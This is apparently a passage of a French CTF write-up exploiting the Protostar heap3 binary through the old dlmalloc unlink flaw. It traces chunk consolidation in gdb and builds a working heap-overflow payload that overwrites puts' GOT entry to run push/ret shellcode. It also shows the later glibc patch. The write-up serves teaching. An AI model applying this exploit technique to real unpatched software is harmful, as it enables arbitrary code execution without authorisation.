Nous sommes ici dans un cas particulier : le chunk libéré étant le dernier, il a été consolidé avec le top chunk car il était à côté. Au lieu de se retrouver avec les pointeurs FD et BK définis, il est devenu le top chunk. On note que le précédent top chunk semble toujours être présent à `0x804a390` mais en réalité c'est seulement parce que `free()` ne fait pas le ménage de la mémoire (il ne réinitialise pas à zéro).

Maintenant avec la libération du premier chunk on entre dans le vif du sujet :

```
(gdb) x/256wx 0x0804a000
0x804a000:      0x00000000      0x00000099      0xb7fd93d0      0xb7fd93d0 <- premier chunk
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a090:      0x00000000      0x00000000      0x00000098      0x00000098 <- second chunk avec la taille du précédent + le flag du précédent utilisé à 0
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a130:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a140:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a1c0:      0x00000000      0x00000000      0x00000000      0x00000099
0x804a1d0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a260:      0x00000000      0x00000099      0x00000000      0x00000000
0x804a270:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a2f0:      0x00000000      0x00000000      0x00000000      0x00020d09
0x804a300:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a390:      0x00000000      0x00020c71      0x00000000      0x00000000
0x804a3a0:      0x00000000      0x00000000      0x00000000      0x00000000
```

On voit que le premier chunk a désormais des entrées FD et BK pointant respectivement vers le chunk suivant et précédent libre. Ici c'est la même adresse qui correspond au `bin` (type de heap) courant :

```
(gdb) x/4wx 0xb7fd93d0
0xb7fd93d0 <main_arena+48>:     0x0804a2f8      0x00000000      0x0804a000      0x0804a000
```

A l'inverse le début de ce `bin` contient l'adresse du premier chunk libre (et qui n'est pas le top chunk).

On voit aussi que comme attendu le chunk 2 conserve désormais la taille du chunk 1 (`0x98`) car ce dernier est libre. Il a aussi son bit de poids faible mis à 0, ce qui fait que la taille affichée est désormais `0x98`.

Bien, maintenant libérons le chunk 3 :

```
(gdb) x/256wx 0x0804a000
0x804a000: 0x00000000 0x00000099 0xb7fd93d0 0x0804a130 <- premier chunk
0x804a010: 0x00000000 0x00000000 0x00000000 0x00000000
--- snip ---
0x804a090: 0x00000000 0x00000000 0x00000098 0x00000098
0x804a0a0: 0x00000000 0x00000000 0x00000000 0x00000000
--- snip ---
0x804a130: 0x00000000 0x00000099 0x0804a000 0xb7fd93d0 <- troisème chunk (libéré)
0x804a140: 0x00000000 0x00000000 0x00000000 0x00000000
--- snip ---
0x804a1c0: 0x00000000 0x00000000 0x00000098 0x00000098 <- quatrième chunk (avec indicateur du précédent chunk libéré)
0x804a1d0: 0x00000000 0x00000000 0x00000000 0x00000000
--- snip ---
0x804a260: 0x00000000 0x00000099 0x00000000 0x00000000
0x804a270: 0x00000000 0x00000000 0x00000000 0x00000000
--- snip ---
0x804a2f0: 0x00000000 0x00000000 0x00000000 0x00020d09
0x804a300: 0x00000000 0x00000000 0x00000000 0x00000000
--- snip ---
0x804a390: 0x00000000 0x00020c71 0x00000000 0x00000000
0x804a3a0: 0x00000000 0x00000000 0x00000000 0x00000000
```

On voit ici que la liste chainée a été bousculée. Le BK du chunk 1 pointe vers le chunk 3 et le FD du chunk 3 pointe vers le chunk 1.

Pour ce qui est du bin :

```
(gdb) x/4wx 0xb7fd93d0
0xb7fd93d0 <main_arena+48>:     0x0804a2f8      0x00000000      0x0804a130      0x0804a000
```

Si on suit les pointeurs FD à partir d'ici on va donc du chunk libéré le plus récent vers le moins récent.

La dernière étape est la libération du chunk 4 qui suit le chunk 3 déjà libéré :

```
(gdb) x/256wx 0x0804a000
0x804a000:      0x00000000      0x00000099      0xb7fd93d0      0x0804a130
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a090:      0x00000000      0x00000000      0x00000098      0x00000098
0x804a0a0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a130:      0x00000000      0x00000131      0x0804a000      0xb7fd93d0
0x804a140:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a1c0:      0x00000000      0x00000000      0x00000098      0x00000098
0x804a1d0:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a260:      0x00000130      0x00000098      0x00000000      0x00000000
0x804a270:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a2f0:      0x00000000      0x00000000      0x00000000      0x00020d09
0x804a300:      0x00000000      0x00000000      0x00000000      0x00000000
--- snip ---
0x804a390:      0x00000000      0x00020c71      0x00000000      0x00000000
0x804a3a0:      0x00000000      0x00000000      0x00000000      0x00000000
```

On voit que les deux chunks ont été consolidés. La taille du chunk est passée de `0x99` à `0x131`. On retrouve aussi l'entête du chunk 4 en mémoire bien qu'il n'existe plus.

Pour le reste rien ne semble avoir changé, en tout cas en apparence.

Lorsque le chunk 4 a été libéré, `malloc` a regardé à gauche puis à droite s'il y avait un chunk libre avec lequel fusionner et ainsi libérer le maximum de place. Voici un schéma avant/après de cette fusion :

![dlmalloc backward consolidation](https://raw.githubusercontent.com/devl00p/blog/master/images/protostar/heap/consilidation_left.png)

Avec une bordure plus épaisse on retrouve les adresses qui ont été altérées dans l'opération.

C'est plus parlant si la consolidation avait été faite du chunk 3 vers le chunk 4 :

![dlmalloc forward consolidation](https://raw.githubusercontent.com/devl00p/blog/master/images/protostar/heap/consilidation_right.png)

Ici on voit bien (en partant du chunk 4) que pour mettre à jour la liste doublement chainée :

- l'entrée FD du chunk pointé par BK a été écrasé par la nouvelle adresse

- l'entrée BK du chunk pointé par FD a été écrasé par la nouvelle adresse

Cela est réalisé dans le code de `malloc()` par une macro baptisée `unlink()` :

```c
#define unlink(P, BK, FD)                                                \
{                                                                        \
  BK = P->bk;                                                            \
  FD = P->fd;                                                            \
  FD->bk = BK;                                                           \
  BK->fd = FD;                                                           \
}
```

### La vulnérabilité

Que la consolidation se fasse vers la droite ou la gauche, dans tous les cas `malloc()` va écraser des données aux adresses qu'il a trouvé dans le chunk libre adjacent car `unlink()` est appelée dans tous les cas.

Consolidation vers le gauche (chunk précédent déjà libre) :

```c
  islr = 0;

  if (!(hd & PREV_INUSE))                    /* consolidate backward */
  {
    prevsz = p->prev_size;
    p = chunk_at_offset(p, -(long)prevsz);
    sz += prevsz;

    if (p->fd == last_remainder(ar_ptr))     /* keep as last_remainder */
      islr = 1;
    else
      unlink(p, bck, fwd);
  }
```

Ici `p` représente le chunk courant. On voit qu'il regarde si le chunk précédent est dispo. Si c'est le cas il devient le nouveau `p` et les adresses `FD` et `BK` de l'ancien chunk sont utilisées par `unlink()`.

Conséquence : si on a le controle du précédent chunk libre on peut écrire ce qu'on veut où l'on veut.

Pour ce qui est de la consolidation avec le chunk immédiatement suivant :

```c
  sz = hd & ~PREV_INUSE;
  next = chunk_at_offset(p, sz);
  nextsz = chunksize(next);
  // --- snip ---
  if (!(inuse_bit_at_offset(next, nextsz)))   /* consolidate forward */
  {
    sz += nextsz;

    if (!islr && next->fd == last_remainder(ar_ptr))
                                              /* re-insert last_remainder */
    {
      islr = 1;
      link_last_remainder(ar_ptr, p);
    }
    else
      unlink(next, bck, fwd);

    next = chunk_at_offset(p, sz);
  }
  else
    set_head(next, nextsz);                  /* clear inuse bit */

  set_head(p, sz | PREV_INUSE);
  next->prev_size = sz;
  if (!islr)
    frontlink(ar_ptr, p, sz, idx, bck, fwd);
}
```

Ici c'est plus compliqué car pour tester que le chunk suivant est libre il faut aller lire le bit de poids faible dans le chunk suivant le suivant.

Dans l'article de *Phrack* ils reformulent la macro *unlink()* sous cette forme :

```c
*(next->fd + 12) = next->bk
*(next->bk + 8) = next->fd
```

Dans tous les cas si on veut exploiter ça il faut être en mesure d'écraser le bit de poids faible d'un chunk pour lui faire croire que le chunk précédent est libre afin qu'il lance la consolidation.

Nous ne sommes pas obligé d'écraser les métadonnées d'un chunk existant, on peut écrire un faux chunk en mémoire mais alors il faut aussi écrire l'information de taille du chunk précédent dans le chunk qui suit pour que `malloc()` aille chercher les métadonnées (FD er BK) à l'emplacement qui nous convient.

### Les contraintes

La première contrainte est de taille : si on écrit `BK` à `FD+12` et `FD` à `BK+8` ça veut dire que les deux adresses doivent être écrivable sinon on va obtenir un beau segfault.

Par conséquence on ne peut pas espérer écrire quelque part l'adresse d'une instruction présente dans le code (du genre l'adresse d'un gadget `jmp eax` qui aurait bien été pratique) car en retour `malloc()` va tenter d'écrire une adresse en plein milieu du code où la plage mémoire est en lecture seule.

C'est une contrainte qui peut être résolue en écrasant une adresse de la `Global Offset Table` (`GOT`). Attention toutefois car ça introduit une valeur invalide dans une autre entrée. Il faut choisir soigneusement.

Autre contrainte ici, sur le binaire du CTF. Voici le tas avant le premier `free()`. Les chunks sont tous initialisés ici avec 4 octets de données :

```
(gdb) x/64wx 0x804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
```

après le premier `free()` on a ceci :

```
(gdb) x/64wx 0x804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
```

Quoi !? Pas de fusion avec le top chunk ni de pointeurs FD et BK ! C'est parce que la taille du chunk est inférieure à `0x80` ce qui fait qu'ils sont gérés par un `bin` particulier nommé `fastbin` qui n'utilise pas de liste chainée.

Pour exploiter la liste chainée il faut donc créer un faux chunk qui a une grosse taille et `malloc()` le traitera comme un chunk normal.

Ca nous amène à la contrainte suivante : `strcpy()`. Avec cette fonction on ne peut pas copier des octets nuls par conséquent au moment d'écraser une taille de chunk (ou taille de chunk précédent) il faut tricher en spécifiant une adresse négative qui ressemblera à `0xffffffXX`. Cela a pour effet que quand `malloc` ira chercher le chunk précédent il ne va pas aller le chercher avant mais après : ce sera inversé !

Allez, une autre contrainte spécifique à ce CTF. Quand j'écrase le chunk suivant j'obtiens bien un segfault :

```
user@protostar:/opt/protostar/bin$ ./heap3 0000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA CCCCC
Segmentation fault
```

Si je recompile le code source et que j'essaye de reproduire avec ma copie :

```
user@protostar:~$ ./mine 0000 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA CCCCC
*** glibc detected *** ./mine: double free or corruption (out): 0x0804a058 ***
======= Backtrace: =========
/lib/libc.so.6(+0x6b0ca)[0xb7f020ca]
/lib/libc.so.6(+0x6c918)[0xb7f03918]
/lib/libc.so.6(cfree+0x6d)[0xb7f06a5d]
./mine[0x8048576]
/lib/libc.so.6(__libc_start_main+0xe6)[0xb7eadc76]
./mine[0x8048431]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:10 149680     /home/user/mine
08049000-0804a000 rw-p 00000000 00:10 149680     /home/user/mine
0804a000-0806b000 rw-p 00000000 00:00 0          [heap]
b7d00000-b7d21000 rw-p 00000000 00:00 0 
b7d21000-b7e00000 ---p 00000000 00:00 0 
b7e78000-b7e95000 r-xp 00000000 00:10 2976       /lib/libgcc_s.so.1
b7e95000-b7e96000 rw-p 0001c000 00:10 2976       /lib/libgcc_s.so.1
b7e96000-b7e97000 rw-p 00000000 00:00 0 
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd6000-b7fd8000 r--p 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd8000-b7fd9000 rw-p 00140000 00:10 759        /lib/libc-2.11.2.so
b7fd9000-b7fdc000 rw-p 00000000 00:00 0 
b7fe0000-b7fe2000 rw-p 00000000 00:00 0 
b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
b7ffe000-b7fff000 r--p 0001a000 00:10 741        /lib/ld-2.11.2.so
b7fff000-b8000000 rw-p 0001b000 00:10 741        /lib/ld-2.11.2.so
bffeb000-c0000000 rw-p 00000000 00:00 0          [stack]
Aborted
```

Donc ma version qui est pourtant compilée sur la VM du CTF dispose d'une protection que le binaire officiel n'a pas. Comment c'est possible ?

Le binaire est pourtant dynamiquement compilé donc utilise la glibc du système :

```shellsession
user@protostar:~$ file /opt/protostar/bin/heap3
/opt/protostar/bin/heap3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
```

Le mystére s'éclaircit quand on lance `nm` sur le binaire :

```shellsession
user@protostar:~$ nm /opt/protostar/bin/heap3
--- snip ---
08048840 t frame_dummy
08049824 T free
0804a4ba t iALLOc
0804a462 T independent_calloc
0804a491 T independent_comalloc
08048889 T main
0804a84c T mallinfo
08048ff2 T malloc
08049a8b t malloc_consolidate
0804893c t malloc_init_state
0804a9df T malloc_stats
0804a7c5 T malloc_trim
0804a7f1 T malloc_usable_size
0804aa5e T mallopt
0804a135 T memalign
--- snip ---
```

Il dispose de plein de symboles liés à `malloc` que mon binaire n'a pas. Le programme vulnérable a du être compilé en incluant les sources de malloc qui ont été copiées préalablement sur le disque, peut être avec des instructions comme :

```c
#include <vulnerable_malloc/malloc.h>
```

Et enfin, dernière contrainte : pour éviter la seconde consolidation qui pourrait crasher le programme, il faut s'assurer qu'on a un bit de poids faible à 1 sur la taille du chunk après le chunk suivant.

### Hammer Time

Cette fois on s'attaque bien au code du CTF :) Lorsque l'on lance le binaire `heap3` avec les arguments `AAAA BBBB CCCC` on obtient le heap suivant :

```
(gdb) x/36wx 0x804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x00000000 <- 3ème chunk (premier à être libéré)
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
```

On voit que le 3ème chunk est à l'adresse `0x804c050`. On va déborder du second chunk pour écraser le champ de taille du précédent chunk et celui de taille du chunk.

Je vais spécifier une taille de -16 soit `0xfffffff0` en hexadécimal :

```python
>>> (-16).to_bytes(4, byteorder=sys.byteorder, signed=True)
b'\xf0\xff\xff\xff'
```

Via la copie dans le 3ème chunk je vais placer mon faux chunk qui sera alors à l'adresse `0x804c060` (la ligne du dessous dans gdb). 

Tout ça est facilité par le fait que les appels à `strcpy()` se font dans l'ordre de création des chunks : le zéro terminal qui est placé par la fonction `strcpy()` au début des données du second chunk sera effacé par le `strcpy()` suivant.

On peut déjà vérifier que `malloc` tente de fusionner notre faux chunk en mettant un FD et BK invalides (respectivement des lettres `D` et des `E`) :

```
(gdb) r AAAA `python -c 'print "B"*32 + "\xf0\xff\xff\xff\xf0\xff\xff\xff"'` `python -c 'print "C"*16 + "DDDDEEEE"'`
Starting program: /opt/protostar/bin/heap3 AAAA `python -c 'print "B"*32 + "\xf0\xff\xff\xff\xf0\xff\xff\xff"'` `python -c 'print "C"*16 + "DDDDEEEE"'`

Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff804) at heap3/heap3.c:24
24      in heap3/heap3.c
(gdb) x/36wx 0x804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0xfffffff0      0xfffffff0      0x43434343      0x43434343 <- on a écrasé la taille du chunk existant pour mettre -16
0x804c060:      0x43434343      0x43434343      0x44444444      0x45454545 <- notre faux chunk
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) ni

Program received signal SIGSEGV, Segmentation fault.
0x080498fd in free (mem=0x804c058) at common/malloc.c:3638
3638    common/malloc.c: No such file or directory.
        in common/malloc.c
(gdb) x/i $eip
0x80498fd <free+217>:   mov    %edx,0xc(%eax)
(gdb) info reg edx eax
edx            0x45454545       1162167621
eax            0x44444444       114532461
```

Ici le breakpoint  a été mis sur le premier appel à `free()` et l'exécution de la fonction provoque un segmentation fault car le programme tente d'écrire la valeur `0x44444444` (`edx`) à l'adresse `0x45454545 + 0xc` (`eax+12`).

On a bien un write-what-where qui correspond à la copie du `BK` dans `FD->BK`.

Maintenant il nous faut les adresses nécessaires à la résolution du challenge. Une fois les deux appels à `free()` passés, le programme utilise `puts()`. On va donc écraser l'adresse de `puts` dans la `GOT` pour quelle pointe sur du code à nous.

```
$ gdb -q ./heap3 
Reading symbols from /opt/protostar/bin/heap3...done.
(gdb) p puts
$1 = {<text variable, no debug info>} 0x8048790 <puts@plt>
(gdb) x/i 0x8048790
0x8048790 <puts@plt>:   jmp    *0x804b128
(gdb) p winner
$3 = {void (void)} 0x8048864 <winner>
```

Malheureusement comme dit plus tôt on ne peut pas simplement écrire l'adresse de `winner` car sinon `malloc` va tenter d'écrire à `winner+8`...

A la place on va y écrire l'adresse `0x804c00c` qui est une adresse des données du premier chunk où l'on placera un petit shellcode. Pour tester on va y placer l'instruction sigtrap qui sera attrapée par le débogueur :

```
(gdb) r `python -c 'print "\xCC" * 16'` `python -c 'print "B"*32 + "\xf0\xff\xff\xff\xf0\xff\xff\xff"'` `python -c 'print "C"*16 + "\x1c\xb1\x04\x08\x0c\xc0\x04\x08"'`
Starting program: /opt/protostar/bin/heap3 `python -c 'print "\xCC" * 16'` `python -c 'print "B"*32 + "\xf0\xff\xff\xff\xf0\xff\xff\xff"'` `python -c 'print "C"*16 + "\x1c\xb1\x04\x08\x0c\xc0\x04\x08"'`

Program received signal SIGSEGV, Segmentation fault.
0x08049921 in free (mem=0x804c058) at common/malloc.c:3643
3643    common/malloc.c: No such file or directory.
        in common/malloc.c
(gdb) x/wx 0x804b128
0x804b128 <_GLOBAL_OFFSET_TABLE_+64>:   0x0804c00c <- l'adresse de puts correspond à notre shellcode
(gdb) x/36wx 0x804c000
0x804c000:      0x00000000      0x00000029      0xcccccccc      0xcccccccc <- notre shellcode commence sur ces 4 derniers octets
0x804c010:      0xcccccccc      0x0804b11c      0x00000000      0x00000000 <- malloc a écrasé l'adresse du shellcode + 8 (écriture de FD)
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0xfffffff0      0xfffffff0      0x43434343      0x43434343
0x804c060:      0x43434343      0x43434343      0x0804b11c      0x0804c00c
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
```

Victoire ! On a bien écrasé la `GOT` et en contrepartie `malloc` a bien écrit à `0x804c00c + 8`. Seulement on n'a pas l'exécution de code espérée mais encore un segfault.

Investiguons ce qu'il se passe en partant de l'instruction fautive :

```
(gdb) x/i $eip
0x8049921 <free+253>:   mov    0x4(%eax),%eax
(gdb) info reg eax
eax            0x4a470280       1246167680
(gdb) x/20i $eip-60
0x80498e5 <free+193>:   mov    -0x34(%ebp),%eax
0x80498e8 <free+196>:   mov    0x8(%eax),%eax
0x80498eb <free+199>:   mov    %eax,-0x14(%ebp)
0x80498ee <free+202>:   mov    -0x34(%ebp),%eax
0x80498f1 <free+205>:   mov    0xc(%eax),%eax
0x80498f4 <free+208>:   mov    %eax,-0x18(%ebp)
0x80498f7 <free+211>:   mov    -0x14(%ebp),%eax
0x80498fa <free+214>:   mov    -0x18(%ebp),%edx
0x80498fd <free+217>:   mov    %edx,0xc(%eax)
0x8049900 <free+220>:   mov    -0x18(%ebp),%eax
0x8049903 <free+223>:   mov    -0x14(%ebp),%edx
0x8049906 <free+226>:   mov    %edx,0x8(%eax)
0x8049909 <free+229>:   mov    -0x38(%ebp),%eax
0x804990c <free+232>:   mov    0x2c(%eax),%eax
0x804990f <free+235>:   cmp    -0x28(%ebp),%eax
0x8049912 <free+238>:   je     0x80499b6 <free+402>
0x8049918 <free+244>:   mov    -0x24(%ebp),%eax
0x804991b <free+247>:   mov    -0x28(%ebp),%edx
0x804991e <free+250>:   lea    (%edx,%eax,1),%eax
0x8049921 <free+253>:   mov    0x4(%eax),%eax
(gdb) info reg edx
edx            0x804c040        134529088
(gdb) x/wx $ebp-0x24
0xbffff6f4:     0x42424240
```

Le code a tenté d'écrire à `eax+4` et cette adresse semble improbable.

En remontant un peu les instructions ont voit que `eax` s'est vu affecté la valeur `edx+eax*1` et que `edx` correspond à `0x804c040` soit 16 octets AVANT et non après comme notre fake chunk.

Le registre `eax` provient quand à lui bien de `ebp-0x24` et correspond aux caractères `B`  que l'on a passé mais avec un bit mis à zéro...

Pas de doute, `malloc` cherche cette fois à consolider le chunk avec le suivant qu'il s'attend à voir à l'adresse `0x804c040`.

On sait que pour voir si le chunk suivant est libre il doit lire l'information sur le suivant du suivant, dans l'information de la taille.

La taille du chunk suivant (qu'il cherche à `0x804c040`) est aussi importante car `malloc` va remonter en mémoire d'autant d'octets. On va continuer avec nos tailles en `-16` :)

C'est parti :

```
(gdb) r `python -c 'print "\xCC" * 16'` `python -c 'print "A"*16 + "\xf1\xff\xff\xff\xf1\xff\xff\xff" + "A" * 8 + "\xf0\xff\xff\xff\xf0\xff\xff\xff"'` `python -c 'print "C"*16 + "\x1c\xb1\x04\x08\x0c\xc0\x04\x08"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap3 `python -c 'print "\xCC" * 16'` `python -c 'print "A"*16 + "\xf1\xff\xff\xff\xf1\xff\xff\xff" + "A" * 8 + "\xf0\xff\xff\xff\xf0\xff\xff\xff"'` `python -c 'print "C"*16 + "\x1c\xb1\x04\x08\x0c\xc0\x04\x08"'`

Program received signal SIGTRAP, Trace/breakpoint trap.
0x0804c00d in ?? ()
(gdb) x/36wx 0x804c000
0x804c000:      0x00000000      0x00000029      0x0804c028      0xcccccccc <- début de notre shellcode
0x804c010:      0xcccccccc      0x0804b11c      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x41414141      0x41414141      0x41414141 <- ici le 41 permet d'indiquer que le chunk du dessous est utilisé, on n'a pas besoin de mentir sur le reste
0x804c040:      0xffffffe0      0xfffffff0      0x41414141      0x41414141 <- chunk "suivant" de taille -16 qui ne sera pas fusionné, notez que malloc a modifié le bit de poids faible
0x804c050:      0xfffffff0      0xfffffff0      0x43434343      0x43434343 <- le chunk qui a été libéré
0x804c060:      0x43434343      0xffffffe1      0x0804b194      0x0804b194 <- le chunk "précédent" qui a amené à notre write-what-where
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
```

Le plus important dans tout ça c'est que cette fois pas de segfault mais un sigtrap : notre instruction `0xCC` (`int3`) a bien été exécutée.

Dernier point génant : notre shellcode va donc commencer à `0x804c00c` mais `malloc` écrase un DWORD 8 octets plus loin...

Si on avait un shellcode un peu long il faudrait qu'il fasse un `jmp` par dessus les 4 octets pour reprendre son exécution après mais ici on a seulement besoin de faire un `call winner`.

Malheureusement les instructions `call` et `jmp` sont relatives (l'opcode a besoin d'un offset). Pour s'éviter des calculs compliqués on peut simplement faire :

```nasm
push   0x8048864
ret
```

Ce qui revient à sauter sur `winner` :

```
user@protostar:/opt/protostar/bin$ ./heap3 `python -c 'print "AAAA\x68\x64\x88\x04\x08\xc3"'` `python -c 'print "A"*16 + "\xf1\xff\xff\xff\xf1\xff\xff\xff" + "A" * 8 + "\xf0\xff\xff\xff\xf0\xff\xff\xff"'` `python -c 'print "C"*16 + "\x1c\xb1\x04\x08\x0c\xc0\x04\x08"'`
that wasn't too bad now, was it? @ 1674238714
```

Cette fois c'est la bonne !

Cette faille unlink a été patchée de cette manière :

```c
#define unlink(AV, P, BK, FD) {
    FD = P->fd;
    BK = P->bk;
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);
    else {
        FD->bk = BK;
        BK->fd = FD;
```

Donc avant d'écraser les données `malloc` vérifie que la liste doublement chainée est dans un état logique. Si ce n'est pas le cas on obtient un message d'erreur comme celui obtenu plus tôt.

Il existe toutefois bien des manières d'attaquer les heap plus modernes et les différents scénarios sont listés ici : [Overview of GLIBC heap exploitation techniques](https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/)

Sur ce CTF on peut encore réduire la taille du payload en utilisant une taille de chunk de -4 signifiant que les différents chunks se chevauchent. Voir [Protostar Walkthrough - Heap | Ayrx's Blog](https://www.ayrx.me/protostar-walkthrough-heap/).